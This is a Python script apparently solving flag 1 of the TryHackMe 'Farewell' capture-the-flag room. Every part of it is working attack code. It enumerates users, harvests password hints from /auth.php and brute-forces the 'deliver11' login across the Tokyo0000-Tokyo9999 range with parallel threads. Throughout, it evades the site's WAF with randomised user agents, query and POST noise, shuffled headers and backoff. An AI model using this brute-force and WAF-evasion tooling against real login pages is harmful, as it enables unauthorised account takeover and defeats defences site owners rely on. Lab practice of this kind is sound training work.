#!/usr/bin/env python3
"""
Farewell TryHackMe – Flag 1: Bruteforce deliver11 via WAF-Bypass

Attack flow:
  1. Enumerate users from banner: adam, deliver11, nora, admin
  2. POST to /auth.php → valid users get password_hint in JSON response
  3. deliver11 hint: "Capital of Japan followed by 4 digits" → Tokyo0000-Tokyo9999
  4. WAF blocks: curl UA, repeated identical requests, rate limiting
  5. WAF bypass: random UA, random query param, random POST noise, shuffled order
  6. Login as deliver11 → Flag 1 on dashboard page

Usage:
  # Full auto: recon + bruteforce + grab flag
  python farewell_first.py --target 10.80.159.6
  
python farewell_first.py --target 10.80.159.6                    # 20 threads default
python farewell_first.py --target 10.80.159.6 --workers 50       # aggressiver
python farewell_first.py --target 10.80.159.6 --workers 5        # vorsichtiger

  # If you already know the password
  python farewell_first.py --target 10.80.159.6 --password Tokyo1010

  [!!!] FLAG FOUND at /:
      THM{USER_ACCESS_1010}
"""

from __future__ import annotations

import argparse
import concurrent.futures
import random
import re
import string
import threading
import time
import urllib.error
import urllib.parse
import urllib.request

UA_TEMPLATES = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{v}.0) Gecko/20100101 Firefox/{v}.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:{v}.0) Gecko/20100101 Firefox/{v}.0",
]


def rand_ua() -> str:
    tpl = random.choice(UA_TEMPLATES)
    return tpl.format(v=random.randint(100, 133))


def rand_str(n: int = 5) -> str:
    return "".join(random.choices(string.ascii_letters, k=n))


def get(url: str, cookies: str = "", timeout: float = 10) -> tuple[int, str]:
    headers = {"User-Agent": rand_ua()}
    if cookies:
        headers["Cookie"] = cookies
    req = urllib.request.Request(url, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.getcode(), resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        body = e.read(4096).decode("utf-8", errors="replace") if e.fp else ""
        return e.code, body
    except Exception as e:
        return 0, str(e)


def post_auth(base: str, username: str, password: str, session_cookie: str = "") -> tuple[int, str]:
    """POST to /auth.php with WAF-bypass evasion."""
    # Random query param to defeat URL-based caching/dedup
    url = f"{base}/auth.php?v={random.randint(1000, 9999)}"

    # Random noise field in POST body
    noise = rand_str(4)
    data = f"username={urllib.parse.quote(username)}&password={urllib.parse.quote(password)}&z={noise}"

    # Randomized headers
    base_headers = [
        ("User-Agent", rand_ua()),
        ("Accept", "*/*"),
        ("Referer", f"{base}/?t={rand_str(3)}"),
        ("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8"),
        ("Origin", base),
        ("Connection", "keep-alive"),
    ]
    random.shuffle(base_headers)
    headers = dict(base_headers)
    if session_cookie:
        headers["Cookie"] = session_cookie

    req = urllib.request.Request(url, data=data.encode(), method="POST", headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            body = resp.read().decode("utf-8", errors="replace")
            # Capture Set-Cookie if present
            cookies_out = resp.headers.get_all("Set-Cookie") or []
            for c in cookies_out:
                if "PHPSESSID" in c:
                    session_cookie = c.split(";")[0]
            return resp.getcode(), body
    except urllib.error.HTTPError as e:
        body = e.read(4096).decode("utf-8", errors="replace") if e.fp else ""
        return e.code, body
    except Exception as e:
        return 0, str(e)


# ── Recon ────────────────────────────────────────────────────────────────────
def recon(target: str) -> str:
    """Enumerate endpoints and gather password hints. Returns session cookie."""
    base = f"http://{target}"
    print("=" * 60)
    print("[RECON] Starting enumeration")
    print("=" * 60)

    # Get main page + session cookie
    headers = {"User-Agent": rand_ua()}
    req = urllib.request.Request(base, headers=headers)
    session = ""
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            body = resp.read().decode("utf-8", errors="replace")
            for c in (resp.headers.get_all("Set-Cookie") or []):
                if "PHPSESSID" in c:
                    session = c.split(";")[0]
            print(f"[+] GET / → {resp.getcode()} ({len(body)} bytes)")
            if session:
                print(f"[+] Session: {session}")
    except Exception as e:
        print(f"[!] Error: {e}")
        return ""

    # Extract usernames from banner
    # Look for farewell messages mentioning usernames
    usernames_found = set()
    # Common pattern: "username" or names in banner text
    for match in re.findall(r'"username"\s*:\s*"([^"]+)"', body):
        usernames_found.add(match)
    # Also try to find names in plain text
    for match in re.findall(r'<strong>(\w+)</strong>', body):
        usernames_found.add(match)

    known_users = ["adam", "deliver11", "nora", "admin"]
    for u in known_users:
        if u not in usernames_found:
            usernames_found.add(u)

    print(f"\n[+] Known users: {sorted(usernames_found)}")

    # Get password hints for each user
    print(f"\n[+] Fetching password hints from /auth.php...")
    for user in sorted(usernames_found):
        code, resp_body = post_auth(base, user, "wrongpassword", session)
        if code == 200:
            # Look for password_hint in response
            hint_match = re.search(r'"password_hint"\s*:\s*"([^"]*)"', resp_body)
            hint = hint_match.group(1) if hint_match else "(no hint)"
            status = "valid" if "auth_failed" in resp_body else "???"
            print(f"    {user:15s} → {status} | hint: {hint}")
            if code == 403:
                print(f"    [!] WAF BLOCKED on user enum")
        elif code == 403:
            print(f"    {user:15s} → 403 WAF BLOCKED")
        else:
            preview = resp_body[:100].replace("\n", " ")
            print(f"    {user:15s} → {code}: {preview}")

    # Check some paths
    print(f"\n[+] Checking endpoints...")
    for path in ["/info.php", "/auth.php", "/admin.php", "/dashboard.php",
                 "/status.php", "/review.php", "/logout.php"]:
        code, _ = get(f"{base}{path}", cookies=session)
        print(f"    GET {path:20s} → {code}")

    print(f"\n[RECON] Done.\n")
    return session


# ── Bruteforce ───────────────────────────────────────────────────────────────
def generate_wordlist() -> list[str]:
    """Generate Tokyo0000-Tokyo9999 wordlist."""
    return [f"Tokyo{i:04d}" for i in range(10000)]


def bruteforce(target: str, username: str, session: str, workers: int = 20) -> str | None:
    """Parallel bruteforce deliver11 password with WAF bypass.

    Uses ThreadPoolExecutor with `workers` threads. Each thread has its own
    random UA/query-noise so requests look like different clients.
    """
    base = f"http://{target}"
    passwords = generate_wordlist()
    random.shuffle(passwords)

    total = len(passwords)
    print(f"\n{'=' * 60}")
    print(f"[BRUTE] Starting PARALLEL bruteforce for '{username}'")
    print(f"[BRUTE] Wordlist: Tokyo0000-Tokyo9999 ({total} passwords, shuffled)")
    print(f"[BRUTE] Workers : {workers} threads")
    print(f"{'=' * 60}\n")

    # Shared state
    found_password: str | None = None
    lock = threading.Lock()
    tried = [0]  # mutable counter
    blocked = [0]

    def try_password(pw: str) -> str | None:
        nonlocal found_password
        # Early exit if another thread already found it
        if found_password:
            return None

        code, body = post_auth(base, username, pw, session)

        with lock:
            tried[0] += 1
            t = tried[0]

        if code == 403:
            with lock:
                blocked[0] += 1
                if blocked[0] % 5 == 1:
                    print(f"[!] WAF BLOCK (total blocks: {blocked[0]})  – backing off 2s")
            time.sleep(2)
            # Retry once after backoff
            code, body = post_auth(base, username, pw, session)
            if code == 403:
                return None

        if code == 200 and "auth_failed" not in body:
            with lock:
                found_password = pw
            return pw

        if t % 200 == 0:
            print(f"[BRUTE] {t}/{total} tried...")
        return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as pool:
        futures = {pool.submit(try_password, pw): pw for pw in passwords}
        for fut in concurrent.futures.as_completed(futures):
            if found_password:
                # Cancel remaining futures
                for f in futures:
                    f.cancel()
                break

    if found_password:
        print(f"\n{'=' * 60}")
        print(f"[!!!] PASSWORD FOUND: {username}:{found_password}")
        print(f"[!!!] Tried {tried[0]} passwords total")
        print(f"{'=' * 60}")
        return found_password

    print(f"\n[!] Exhausted wordlist – password not found ({tried[0]} tried)")
    return None


# ── Grab flag ────────────────────────────────────────────────────────────────
def login_and_grab_flag(target: str, username: str, password: str) -> str | None:
    """Login as deliver11 and find the flag on the dashboard page."""
    base = f"http://{target}"

    # Get fresh session
    headers = {"User-Agent": rand_ua()}
    req = urllib.request.Request(base, headers=headers)
    session = ""
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            for c in (resp.headers.get_all("Set-Cookie") or []):
                if "PHPSESSID" in c:
                    session = c.split(";")[0]
    except Exception:
        pass

    print(f"\n[+] Logging in as {username}...")
    code, body = post_auth(base, username, password, session)
    print(f"[+] Login response: {code} ({len(body)} bytes)")

    if code != 200 or "auth_failed" in body:
        print(f"[!] Login failed: {body[:200]}")
        return None

    print(f"[+] Login successful!")

    # Now access the dashboard/home page with the session
    pages = ["/", "/index.php", "/dashboard.php", "/home.php", "/farewell.php",
             "/messages.php", "/write.php"]

    for path in pages:
        code, body = get(f"{base}{path}", cookies=session)
        if code == 200 and len(body) > 100:
            flags = re.findall(r'(?:THM|flag)\{[^}]+\}', body, re.I)
            if flags:
                print(f"\n{'=' * 60}")
                print(f"[!!!] FLAG FOUND at {path}:")
                for f in flags:
                    print(f"      {f}")
                print(f"{'=' * 60}")
                return flags[0]

            if "farewell" in body.lower() or "message" in body.lower() or "welcome" in body.lower():
                print(f"[+] {path} → authenticated page ({len(body)} bytes)")
                # Search whole body
                for line in body.split("\n"):
                    if re.search(r'THM\{|flag\{', line, re.I):
                        flag = re.search(r'(?:THM|flag)\{[^}]+\}', line, re.I)
                        if flag:
                            print(f"\n[!!!] FLAG: {flag.group(0)}")
                            return flag.group(0)

    # If flag not found in body, print what we see
    print("[!] Flag not found in page source – check manually")
    print(f"[i] Session cookie: {session}")
    print(f"[i] Use this cookie in browser to explore")
    return None


# ── Main ─────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="Farewell Flag 1: Bruteforce deliver11 with WAF bypass"
    )
    parser.add_argument("--target", default="10.80.159.6", help="Target IP")
    parser.add_argument("--user", default="deliver11", help="Username to bruteforce")
    parser.add_argument("--password", help="Skip bruteforce, use this password directly")
    parser.add_argument("--recon-only", action="store_true", help="Only run recon")
    parser.add_argument("--workers", type=int, default=20, help="Parallel threads (default: 20)")
    args = parser.parse_args()

    # ── Recon ──
    session = recon(args.target)

    if args.recon_only:
        return

    # ── Login with known password or bruteforce ──
    if args.password:
        login_and_grab_flag(args.target, args.user, args.password)
        return

    # ── Bruteforce ──
    password = bruteforce(args.target, args.user, session, workers=args.workers)
    if password:
        login_and_grab_flag(args.target, args.user, password)


if __name__ == "__main__":
    main()
